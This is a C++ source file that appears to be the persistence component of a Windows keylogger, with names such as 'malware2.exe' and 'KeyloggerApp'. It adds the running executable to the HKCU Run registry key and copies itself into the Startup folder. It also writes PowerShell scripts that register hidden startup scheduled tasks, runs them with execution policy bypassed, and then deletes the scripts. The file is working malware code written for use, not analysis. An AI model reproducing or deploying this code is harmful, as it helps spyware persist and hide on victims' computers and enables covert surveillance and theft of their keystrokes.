#include <iostream>
#include <windows.h>
#include <tchar.h>
#include <Shlobj.h>
#include <cstdlib>
#include <fstream>
#include <string>
#include "persistence.h"
// Link with Windows Socket API and Common Controls libraries.
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "comctl32.lib")

// Configures an application to auto-start by adding it to the Windows Registry.
bool configureAutoStart(LPCTSTR appName, LPCTSTR appPath) {
    HKEY keyHandle;
    // Open the registry key for auto-start configuration.
    LONG opResult = RegOpenKeyEx(HKEY_CURRENT_USER,
        _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        0, KEY_SET_VALUE, &keyHandle);

    if (opResult != ERROR_SUCCESS) {
        return false;
    }

    // Set the value in the registry to make the application auto-start.
    opResult = RegSetValueEx(keyHandle, appName, 0, REG_SZ,
        (BYTE*)appPath, (_tcslen(appPath) + 1) * sizeof(TCHAR));

    // Close the registry key.
    RegCloseKey(keyHandle);

    return opResult == ERROR_SUCCESS;
}

// Checks if auto-start is enabled for a specific application.
bool checkAutoStartEnabled(LPCTSTR appName) {
    HKEY keyHandle;
    // Open the registry key for querying.
    LONG opResult = RegOpenKeyEx(HKEY_CURRENT_USER,
        _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        0, KEY_QUERY_VALUE, &keyHandle);

    if (opResult != ERROR_SUCCESS) {
        return false;
    }

    // Query the registry to check if the application auto-start is set.
    opResult = RegQueryValueEx(keyHandle, appName, NULL, NULL, NULL, NULL);
    // Close the registry key.
    RegCloseKey(keyHandle);

    return opResult == ERROR_SUCCESS;
}

// Main function for setting up persistence. 
int setupPersistence() {
    LPCTSTR appAlias = _T("malware2.exe");
    LPCTSTR appExecutablePath = _T("C:\\ProgramData\\malware2.exe");

    if (checkAutoStartEnabled(appAlias)) {
        _tprintf(_T("Auto-start already configured for %s.!!\n"), appAlias);
        return 1;
    }
    return 0;
}
// Function to copy the current executable to the Startup folder
// Function to copy the current executable to the Startup folder
bool copyToStartupFolder() {
    wchar_t currentPath[MAX_PATH];
    wchar_t startupPath[MAX_PATH];

    // Get the full path of the current executable
    if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
        std::cerr << "[ERROR] Failed to get executable path. Error code: " << GetLastError() << std::endl;
        return false;
    }

    // Get the path to the user's Startup folder
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
        std::wstring destinationPath = std::wstring(startupPath) + L"\\malware2.exe";

        // Copy the file to the Startup folder
        if (CopyFileW(currentPath, destinationPath.c_str(), FALSE)) {
            // std::wcout << L"[SUCCESS] File copied to: " << destinationPath << std::endl;
            return true;
        } else {
            // std::cerr << "[ERROR] Failed to copy file. Error code: " << GetLastError() << std::endl;
            return false;
        }
    } else {
        // std::cerr << "[ERROR] Failed to get Startup folder path." << std::endl;
        return false;
    }
}


// Sets up and runs a scheduled task using a PowerShell script.
void setupAndRunScheduledTask() {
    std::string scriptFilename = "ScheduledTaskScript.ps1";
    std::ofstream scriptFile(scriptFilename);

    if (!scriptFile.is_open()) {
        std::cerr << "Failed to open file for writing." << std::endl;
        return;
    }

    // Write the PowerShell script to create and register a scheduled task.
    scriptFile << "$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name\n\n";
    scriptFile << "$Action = New-ScheduledTaskAction -Execute \"Ruta\\de\\tu\\aplicación.exe\"\n\n";
    scriptFile << "$Trigger = New-ScheduledTaskTrigger -AtStartup\n\n";
    scriptFile << "$Principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive\n\n";
    scriptFile << "$Settings = New-ScheduledTaskSettingsSet -Hidden\n\n";
    scriptFile << "$Task = New-ScheduledTask -Action $Action -Principal $Principal -Trigger $Trigger -Settings $Settings\n\n";
    scriptFile << "Register-ScheduledTask \"NombreDeLaTarea\" -InputObject $Task\n";

    scriptFile.close();

    std::cout << "PS1 file successfully created: " << scriptFilename << std::endl;
    // Execute the PowerShell script.
    std::string cmd = "PowerShell -ExecutionPolicy Bypass -File " + scriptFilename;
    system(cmd.c_str());

    // Delete the PowerShell script file after execution.
    if (remove(scriptFilename.c_str()) != 0) {
        std::perror("Error deleting the file");
    }
    else {
        std::cout << "PS1 file successfully deleted!" << std::endl;
    }
}

// Main function to set up registry-based persistence.
void setupRegistryPersistence() {
    LPCTSTR appAlias = _T("KeyloggerApp");
    TCHAR appPath[MAX_PATH];

    // Get the full path of the current executable.
    if (GetModuleFileName(NULL, appPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get executable path." << std::endl;
        return;
    }

    // Check if auto-start is already configured.
    if (checkAutoStartEnabled(appAlias)) {
        std::cout << "[INFO] Auto-start already configured for " << appAlias << "." << std::endl;
    } else {
        // Configure auto-start.
        if (configureAutoStart(appAlias, appPath)) {
            std::cout << "[INFO] Keylogger successfully added to auto-start." << std::endl;
        } else {
            std::cerr << "[ERROR] Failed to add keylogger to auto-start." << std::endl;
        }
    }
}

// Function to create a scheduled task using a PowerShell script.
void setupScheduledTaskPersistence() {
    std::string scriptFilename = "KeyloggerScheduledTask.ps1";
    std::ofstream scriptFile(scriptFilename);

    if (!scriptFile.is_open()) {
        std::cerr << "Failed to create PowerShell script file." << std::endl;
        return;
    }

    // Get the full path of the current executable.
    char appPath[MAX_PATH];
    if (GetModuleFileNameA(NULL, appPath, MAX_PATH) == 0) {
        std::cerr << "Failed to get executable path." << std::endl;
        return;
    }

    // Write the PowerShell script.
    scriptFile << "$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name\n";
    scriptFile << "$Action = New-ScheduledTaskAction -Execute \"" << appPath << "\"\n";
    scriptFile << "$Trigger = New-ScheduledTaskTrigger -AtStartup\n";
    scriptFile << "$Principal = New-ScheduledTaskPrincipal -UserId $currentUser -LogonType Interactive\n";
    scriptFile << "$Settings = New-ScheduledTaskSettingsSet -Hidden\n";
    scriptFile << "$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings\n";
    scriptFile << "Register-ScheduledTask -TaskName \"KeyloggerTask\" -InputObject $Task\n";

    scriptFile.close();

    // Execute the PowerShell script.
    std::string cmd = "PowerShell -ExecutionPolicy Bypass -File " + scriptFilename;
    if (system(cmd.c_str()) != 0) {
        std::cerr << "[ERROR] Failed to create scheduled task." << std::endl;
    } else {
        std::cout << "[INFO] Scheduled task created successfully." << std::endl;
    }

    // Clean up the script file.
    if (remove(scriptFilename.c_str()) != 0) {
        std::cerr << "[ERROR] Failed to delete PowerShell script file." << std::endl;
    }
}